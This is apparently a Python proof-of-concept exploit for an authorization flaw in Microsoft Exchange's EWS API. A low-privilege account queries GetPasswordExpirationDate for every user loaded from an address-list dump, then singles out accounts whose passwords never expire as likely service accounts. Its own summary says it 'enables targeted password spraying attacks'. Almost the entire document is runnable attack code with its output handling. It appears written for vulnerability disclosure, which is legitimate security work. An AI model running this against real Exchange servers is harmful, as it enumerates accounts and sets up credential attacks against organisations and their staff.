#!/usr/bin/env python3
"""
author: htpro
PoC: GetPasswordExpirationDate Authorization Bypass
Demonstrates that any authenticated user can retrieve password expiration dates
for ALL users in the organization without administrative privileges.

Target: Microsoft Exchange Server (EWS API)
Severity: 
CVSS: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

python3 poc-password-expiration-date.py
"""

import requests
from requests.auth import HTTPBasicAuth
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)

# Test Environment Configuration
EWS_URL = "https://domail.example.com/EWS/Exchange.asmx"
USERNAME = r"`DOMAIN\lolin"  # Low-privilege user account (raw string to fix escape)
PASSWORD = "redacted"

auth = HTTPBasicAuth(USERNAME, PASSWORD)

print("="*80)
print("PoC: GetPasswordExpirationDate Authorization Bypass")
print("Microsoft Exchange Server - EWS API")
print("="*80)
print(f"\nAuthenticated as: {USERNAME} (non-privileged user)")
print(f"Target: {EWS_URL}")
print(f"Test started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("\n" + "="*80)

# Load users from company GAL dump
import os
users_file = "./users-test.txt"
if os.path.exists(users_file):
    with open(users_file, 'r') as f:
        target_users = [line.strip() for line in f if line.strip() and '@' in line]
    print(f"[+] Loaded {len(target_users)} users from {users_file}")
else:
    # Fallback: Top targets from GAL
    target_users = [

]
    print(f"[!] Using fallback list: {len(target_users)} users")

results = {
    "success": [],
    "never_expires": [],
    "errors": []
}

print("\n[*] Testing GetPasswordExpirationDate on multiple users...\n")

for email in target_users:
    soap = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013" />
  </soap:Header>
  <soap:Body>
    <m:GetPasswordExpirationDate>
      <m:MailboxSmtpAddress>{email}</m:MailboxSmtpAddress>
    </m:GetPasswordExpirationDate>
  </soap:Body>
</soap:Envelope>"""

    try:
        resp = requests.post(EWS_URL, data=soap, headers={'Content-Type': 'text/xml; charset=utf-8'}, 
                            auth=auth, verify=False, timeout=10)
        
        if resp.status_code == 200:
            root = ET.fromstring(resp.text)
            
            for elem in root.iter():
                tag = elem.tag.split('}')[-1]
                if tag == 'PasswordExpirationDate':
                    expiration_date = elem.text
                    results["success"].append({
                        "email": email,
                        "expiration": expiration_date
                    })
                    
                    status = "DISCLOSED"
                    if not expiration_date or expiration_date == "":
                        status = "NEVER EXPIRES (potential service account)"
                        results["never_expires"].append(email)
                    
                    print(f"{status} | {email:50} | {expiration_date}")
                    break
        else:
            results["errors"].append(email)
            print(f"ERROR    | {email:50} | HTTP {resp.status_code}")
            
    except Exception as e:
        results["errors"].append(email)
        print(f"EXCEPTION | {email:50} | {str(e)[:30]}")

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print(f"Total users tested: {len(target_users)}")
print(f"Successfully disclosed: {len(results['success'])}")
print(f"Accounts with passwords that never expire: {len(results['never_expires'])}")
print(f"Errors: {len(results['errors'])}")

if results["never_expires"]:
    print("\n#!#: Accounts with passwords that never expire:")
    for email in results["never_expires"]:
        print(f"   - {email}")

print("\n" + "="*80)
print("IMPACT:")
print("  - Any authenticated user can enumerate password expiration dates")
print("  - Identifies service accounts (passwords that never expire)")
print("  - Enables targeted password spraying attacks")
print("  - Violates principle of least privilege")
print("="*80)
print(f"\nTest completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
